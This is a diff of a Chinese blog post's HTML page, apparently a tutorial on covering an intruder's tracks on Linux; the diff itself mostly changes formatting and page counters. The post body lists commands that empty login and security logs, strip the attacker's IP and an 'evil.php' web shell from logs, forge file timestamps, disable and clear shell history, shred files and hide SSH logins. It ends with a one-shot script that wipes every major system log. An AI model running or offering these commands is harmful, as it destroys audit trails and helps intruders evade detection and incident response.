@@ -278,7 +278,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.9k</span>
+              <span>1.8k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -298,32 +298,44 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="登录痕迹清理"><a href="#登录痕迹清理" class="headerlink" title="登录痕迹清理"></a>登录痕迹清理</h3><h4 id="基本的日志结构"><a href="#基本的日志结构" class="headerlink" title="基本的日志结构"></a>基本的日志结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/var/log/btmp 记录所有登录失败信息，使用lastb命令查看</span><br><span class="line">/var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看</span><br><span class="line">/var/log/wtmp 记录所有用户的登录、注销信息，使用last命令查看</span><br><span class="line">/var/log/utmp 记录当前已经登录的用户信息，使用w,who,users等命令查看</span><br><span class="line">/var/log/secure 记录与安全相关的日志信息</span><br><span class="line">/var/log/message 记录系统启动后的信息和错误日志</span><br></pre></td></tr></table></figure>
-
-<h4 id="清除日志"><a href="#清除日志" class="headerlink" title="清除日志"></a>清除日志</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># lastb</span><br><span class="line">echo &gt; /var/log/btmp</span><br><span class="line"># last</span><br><span class="line">echo &gt; /var/log/wtmp</span><br><span class="line"># 清除用户最后一次登录时间</span><br><span class="line">echo &gt; /var/log/lastlog </span><br><span class="line"># 清除安全日志记录</span><br><span class="line">cat /dev/null &gt; /var/log/secure</span><br><span class="line"># 清除系统日志记录</span><br><span class="line">cat /dev/null &gt; /var/log/secure</span><br><span class="line"># 清除当前登录用户的信息</span><br><span class="line">echo &gt; /var/log/utmp </span><br></pre></td></tr></table></figure>
-
-<h4 id="删除所有匹配到字符串的行-比如以当天日期或者自己的登录ip"><a href="#删除所有匹配到字符串的行-比如以当天日期或者自己的登录ip" class="headerlink" title="删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip"></a>删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip</h4><p><code>sed -i &#39;/自己的ip/&#39;d /var/log/messages</code></p>
-<h4 id="全局替换自己ip"><a href="#全局替换自己ip" class="headerlink" title="全局替换自己ip"></a>全局替换自己ip</h4><p><code>sed -i &#39;s/192.168.166.85/192.168.1.1/g&#39; secure</code></p>
+        <h3 id="登录痕迹清理">登录痕迹清理</h3>
+<h4 id="基本的日志结构">基本的日志结构</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/var/log/btmp 记录所有登录失败信息，使用lastb命令查看</span><br><span class="line">/var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看</span><br><span class="line">/var/log/wtmp 记录所有用户的登录、注销信息，使用last命令查看</span><br><span class="line">/var/log/utmp 记录当前已经登录的用户信息，使用w,who,users等命令查看</span><br><span class="line">/var/log/secure 记录与安全相关的日志信息</span><br><span class="line">/var/log/message 记录系统启动后的信息和错误日志</span><br></pre></td></tr></table></figure>
+<h4 id="清除日志">清除日志</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># lastb</span><br><span class="line">echo &gt; /var/log/btmp</span><br><span class="line"># last</span><br><span class="line">echo &gt; /var/log/wtmp</span><br><span class="line"># 清除用户最后一次登录时间</span><br><span class="line">echo &gt; /var/log/lastlog </span><br><span class="line"># 清除安全日志记录</span><br><span class="line">cat /dev/null &gt; /var/log/secure</span><br><span class="line"># 清除系统日志记录</span><br><span class="line">cat /dev/null &gt; /var/log/secure</span><br><span class="line"># 清除当前登录用户的信息</span><br><span class="line">echo &gt; /var/log/utmp </span><br></pre></td></tr></table></figure>
+<h4 id="删除所有匹配到字符串的行比如以当天日期或者自己的登录ip">删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip</h4>
+<p><code>sed -i '/自己的ip/'d /var/log/messages</code></p>
+<h4 id="全局替换自己ip">全局替换自己ip</h4>
+<p><code>sed -i 's/192.168.166.85/192.168.1.1/g' secure</code></p>
 <p>前面是待替换ip 后面为替换后的ip</p>
-<h3 id="时间痕迹清理"><a href="#时间痕迹清理" class="headerlink" title="时间痕迹清理"></a>时间痕迹清理</h3><p><code>ls -al</code> 可以查看创建时间</p>
-<h4 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">touch -r 目标时间的文件 需要修改时间的文件</span><br><span class="line">touch -d &quot;2018-04-18 08:00:00&quot; Th1s_isnot_flag.txt</span><br><span class="line">-a ： 仅修改access time</span><br><span class="line">-c ：仅修改时间，而不建立文件</span><br><span class="line">-d ：后面可以接日期，也可以使用 --date=&quot;日期或时间&quot;</span><br><span class="line">-m ：仅修改mtime</span><br><span class="line">-t ：后面可以接时间，格式为 [YYMMDDhhmm]</span><br></pre></td></tr></table></figure>
-
-<h4 id="date"><a href="#date" class="headerlink" title="date"></a>date</h4><p><code>date -s 20140712 18:30:50</code> 将当前系统日期修改为2014年07月12 18:30:50</p>
-<h4 id="hwclock"><a href="#hwclock" class="headerlink" title="hwclock"></a>hwclock</h4><p><code>hwclock --hctosys</code>  # –hctosys 将系统时钟调整为与目前的硬件时钟一致。</p>
-<h3 id="操作痕迹清理"><a href="#操作痕迹清理" class="headerlink" title="操作痕迹清理"></a>操作痕迹清理</h3><h4 id="服务日志修改"><a href="#服务日志修改" class="headerlink" title="服务日志修改"></a>服务日志修改</h4><p># 使用grep -v来把我们的相关信息删除,</p>
+<h3 id="时间痕迹清理">时间痕迹清理</h3>
+<p><code>ls -al</code> 可以查看创建时间</p>
+<h4 id="touch">touch</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">touch -r 目标时间的文件 需要修改时间的文件</span><br><span class="line">touch -d &quot;2018-04-18 08:00:00&quot; Th1s_isnot_flag.txt</span><br><span class="line">-a ： 仅修改access time</span><br><span class="line">-c ：仅修改时间，而不建立文件</span><br><span class="line">-d ：后面可以接日期，也可以使用 --date=&quot;日期或时间&quot;</span><br><span class="line">-m ：仅修改mtime</span><br><span class="line">-t ：后面可以接时间，格式为 [YYMMDDhhmm]</span><br></pre></td></tr></table></figure>
+<h4 id="date">date</h4>
+<p><code>date -s 20140712 18:30:50</code>
+将当前系统日期修改为2014年07月12 18:30:50</p>
+<h4 id="hwclock">hwclock</h4>
+<p><code>hwclock --hctosys</code> # --hctosys
+将系统时钟调整为与目前的硬件时钟一致。</p>
+<h3 id="操作痕迹清理">操作痕迹清理</h3>
+<h4 id="服务日志修改">服务日志修改</h4>
+<p># 使用grep -v来把我们的相关信息删除,</p>
 <p><code>cat /var/log/nginx/access.log | grep -v evil.php &gt; tmp.log</code></p>
 <p># 把修改过的日志覆盖到原日志文件</p>
-<p><code>cat tmp.log &gt; /var/log/nginx/access.log/</code> </p>
-<h4 id="history记录清理"><a href="#history记录清理" class="headerlink" title="history记录清理"></a>history记录清理</h4><ul>
+<p><code>cat tmp.log &gt; /var/log/nginx/access.log/</code></p>
+<h4 id="history记录清理">history记录清理</h4>
+<ul>
 <li>登录ssh后不记录history</li>
 </ul>
 <p><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;export HISTSIZE=0; export HISTFILESIZE=0</code></p>
 <ul>
 <li>清理 <code>~/.bash_history</code></li>
-<li><code>history -c </code></li>
+<li><code>history -c</code></li>
 <li><code>vim /etc/profile</code> 修改 <code>HISTSIZE=0</code></li>
 </ul>
-<h4 id="文件覆写"><a href="#文件覆写" class="headerlink" title="文件覆写"></a>文件覆写</h4><ul>
+<h4 id="文件覆写">文件覆写</h4>
+<ul>
 <li>单文件</li>
 </ul>
 <p><code>shred -f -u -z -v -n 8 1.txt</code></p>
@@ -331,11 +343,15 @@
 <li>文件夹</li>
 </ul>
 <p><code>wipe -r</code></p>
-<h3 id="隐藏ssh登录记录"><a href="#隐藏ssh登录记录" class="headerlink" title="隐藏ssh登录记录"></a>隐藏ssh登录记录</h3><p><code>ssh -T root@192.168.0.1 /bin/bash -i</code></p>
+<h3 id="隐藏ssh登录记录">隐藏ssh登录记录</h3>
+<p><code>ssh -T root@192.168.0.1 /bin/bash -i</code></p>
 <p><code>ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</code></p>
-<p><code>-o UserKnownHostsFile=/dev/null</code> #这个是knowhost的信息及公钥</p>
-<p><code>-T user@host /bin/bash –i</code> #不分配伪终端但是给个bash的终端</p>
-<h3 id="一键清除脚本"><a href="#一键清除脚本" class="headerlink" title="一键清除脚本"></a>一键清除脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/bash</span></span><br><span class="line">echo &gt; /var/log/syslog</span><br><span class="line">echo &gt; /var/log/messages</span><br><span class="line">echo &gt; /var/log/httpd/access_log</span><br><span class="line">echo &gt; /var/log/httpd/error_log</span><br><span class="line">echo &gt; /var/log/xferlog</span><br><span class="line">echo &gt; /var/log/secure</span><br><span class="line">echo &gt; /var/log/auth.log</span><br><span class="line">echo &gt; /var/log/user.log</span><br><span class="line">echo &gt; /var/log/wtmp</span><br><span class="line">echo &gt; /var/log/lastlog</span><br><span class="line">echo &gt; /var/log/btmp</span><br><span class="line">echo &gt; /var/run/utmp</span><br><span class="line">rm ~/./bash_history</span><br><span class="line">history -c</span><br></pre></td></tr></table></figure>
+<p><code>-o UserKnownHostsFile=/dev/null</code>
+#这个是knowhost的信息及公钥</p>
+<p><code>-T user@host /bin/bash –i</code>
+#不分配伪终端但是给个bash的终端</p>
+<h3 id="一键清除脚本">一键清除脚本</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/bash</span></span><br><span class="line">echo &gt; /var/log/syslog</span><br><span class="line">echo &gt; /var/log/messages</span><br><span class="line">echo &gt; /var/log/httpd/access_log</span><br><span class="line">echo &gt; /var/log/httpd/error_log</span><br><span class="line">echo &gt; /var/log/xferlog</span><br><span class="line">echo &gt; /var/log/secure</span><br><span class="line">echo &gt; /var/log/auth.log</span><br><span class="line">echo &gt; /var/log/user.log</span><br><span class="line">echo &gt; /var/log/wtmp</span><br><span class="line">echo &gt; /var/log/lastlog</span><br><span class="line">echo &gt; /var/log/btmp</span><br><span class="line">echo &gt; /var/run/utmp</span><br><span class="line">rm ~/./bash_history</span><br><span class="line">history -c</span><br></pre></td></tr></table></figure>
 
     </div>
 
@@ -465,7 +481,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">登录痕迹清理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%97%A5%E5%BF%97%E7%BB%93%E6%9E%84"><span class="nav-number">1.1.</span> <span class="nav-text">基本的日志结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B8%85%E9%99%A4%E6%97%A5%E5%BF%97"><span class="nav-number">1.2.</span> <span class="nav-text">清除日志</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E5%8C%B9%E9%85%8D%E5%88%B0%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E8%A1%8C-%E6%AF%94%E5%A6%82%E4%BB%A5%E5%BD%93%E5%A4%A9%E6%97%A5%E6%9C%9F%E6%88%96%E8%80%85%E8%87%AA%E5%B7%B1%E7%9A%84%E7%99%BB%E5%BD%95ip"><span class="nav-number">1.3.</span> <span class="nav-text">删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%A8%E5%B1%80%E6%9B%BF%E6%8D%A2%E8%87%AA%E5%B7%B1ip"><span class="nav-number">1.4.</span> <span class="nav-text">全局替换自己ip</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">时间痕迹清理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#touch"><span class="nav-number">2.1.</span> <span class="nav-text">touch</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#date"><span class="nav-number">2.2.</span> <span class="nav-text">date</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hwclock"><span class="nav-number">2.3.</span> <span class="nav-text">hwclock</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="nav-number">3.</span> <span class="nav-text">操作痕迹清理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E6%97%A5%E5%BF%97%E4%BF%AE%E6%94%B9"><span class="nav-number">3.1.</span> <span class="nav-text">服务日志修改</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#history%E8%AE%B0%E5%BD%95%E6%B8%85%E7%90%86"><span class="nav-number">3.2.</span> <span class="nav-text">history记录清理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%A6%86%E5%86%99"><span class="nav-number">3.3.</span> <span class="nav-text">文件覆写</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%90%E8%97%8Fssh%E7%99%BB%E5%BD%95%E8%AE%B0%E5%BD%95"><span class="nav-number">4.</span> <span class="nav-text">隐藏ssh登录记录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E9%94%AE%E6%B8%85%E9%99%A4%E8%84%9A%E6%9C%AC"><span class="nav-number">5.</span> <span class="nav-text">一键清除脚本</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">登录痕迹清理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%97%A5%E5%BF%97%E7%BB%93%E6%9E%84"><span class="nav-number">1.1.</span> <span class="nav-text">基本的日志结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B8%85%E9%99%A4%E6%97%A5%E5%BF%97"><span class="nav-number">1.2.</span> <span class="nav-text">清除日志</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E5%8C%B9%E9%85%8D%E5%88%B0%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E8%A1%8C%E6%AF%94%E5%A6%82%E4%BB%A5%E5%BD%93%E5%A4%A9%E6%97%A5%E6%9C%9F%E6%88%96%E8%80%85%E8%87%AA%E5%B7%B1%E7%9A%84%E7%99%BB%E5%BD%95ip"><span class="nav-number">1.3.</span> <span class="nav-text">删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%A8%E5%B1%80%E6%9B%BF%E6%8D%A2%E8%87%AA%E5%B7%B1ip"><span class="nav-number">1.4.</span> <span class="nav-text">全局替换自己ip</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">时间痕迹清理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#touch"><span class="nav-number">2.1.</span> <span class="nav-text">touch</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#date"><span class="nav-number">2.2.</span> <span class="nav-text">date</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hwclock"><span class="nav-number">2.3.</span> <span class="nav-text">hwclock</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="nav-number">3.</span> <span class="nav-text">操作痕迹清理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E6%97%A5%E5%BF%97%E4%BF%AE%E6%94%B9"><span class="nav-number">3.1.</span> <span class="nav-text">服务日志修改</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#history%E8%AE%B0%E5%BD%95%E6%B8%85%E7%90%86"><span class="nav-number">3.2.</span> <span class="nav-text">history记录清理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%A6%86%E5%86%99"><span class="nav-number">3.3.</span> <span class="nav-text">文件覆写</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%90%E8%97%8Fssh%E7%99%BB%E5%BD%95%E8%AE%B0%E5%BD%95"><span class="nav-number">4.</span> <span class="nav-text">隐藏ssh登录记录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E9%94%AE%E6%B8%85%E9%99%A4%E8%84%9A%E6%9C%AC"><span class="nav-number">5.</span> <span class="nav-text">一键清除脚本</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -481,7 +497,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -529,7 +545,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -543,7 +559,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -554,7 +570,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -694,6 +710,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
